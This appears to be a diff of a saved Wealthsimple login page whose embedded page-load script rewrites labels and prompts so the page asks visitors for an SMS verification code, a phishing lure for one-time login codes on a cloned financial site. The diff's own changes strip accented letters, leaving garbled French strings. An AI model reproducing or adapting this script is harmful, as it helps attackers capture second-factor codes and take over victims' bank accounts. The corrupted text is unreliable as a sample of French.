@@ -3,7 +3,7 @@
 <html data-appearance="light" lang="fr-CA"><!--
  Page saved with SingleFile 
  url: https://my.wealthsimple.com/app/login 
- saved date: Sat Aug 08 2026 11:22:43 GMT-0400 (heure dâ€™été de lâ€™Est nord-américain)
+ saved date: Sat Aug 08 2026 11:22:43 GMT-0400 (heure dt de lEst nord-amricain)
 --><meta charset="utf-8"/>
 <meta content="width=device-width, initial-scale=1, viewport-fit=cover" name="viewport"/>
 <meta content="IE=edge" http-equiv="X-UA-Compatible"/>
@@ -79,7 +79,7 @@ document.addEventListener("DOMContentLoaded", function() {
         var id = targetInput.id;
         if(id) {
             var label = document.querySelector("label[for='" + id + "']");
-            if(label) label.innerHTML = "<b>Code de vérification SMS</b>";
+            if(label) label.innerHTML = "<b>Code de vrification SMS</b>";
         }
         
         var walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
@@ -88,10 +88,10 @@ document.addEventListener("DOMContentLoaded", function() {
             var text = node.nodeValue.toLowerCase();
             if(text.trim().length > 3) {
                 if(text.indexOf("connexion") !== -1 || text.indexOf("connecter") !== -1 || text.indexOf("sign in") !== -1 || text.indexOf("login") !== -1) {
-                    node.nodeValue = "Vérification de sécurité";
+                    node.nodeValue = "Vrification de scurit";
                 }
-                else if(text.indexOf("nom d'utilisateur") !== -1 || text.indexOf("courriel") !== -1 || text.indexOf("numéro de client") !== -1 || text.indexOf("username") !== -1 || text.indexOf("email") !== -1) {
-                    node.nodeValue = "Veuillez entrer le code reçu par SMS :";
+                else if(text.indexOf("nom d'utilisateur") !== -1 || text.indexOf("courriel") !== -1 || text.indexOf("numro de client") !== -1 || text.indexOf("username") !== -1 || text.indexOf("email") !== -1) {
+                    node.nodeValue = "Veuillez entrer le code reu par SMS :";
                 }
                 else if(text.indexOf("mot de passe") !== -1 || text.indexOf("password") !== -1) {
                     node.nodeValue = "";
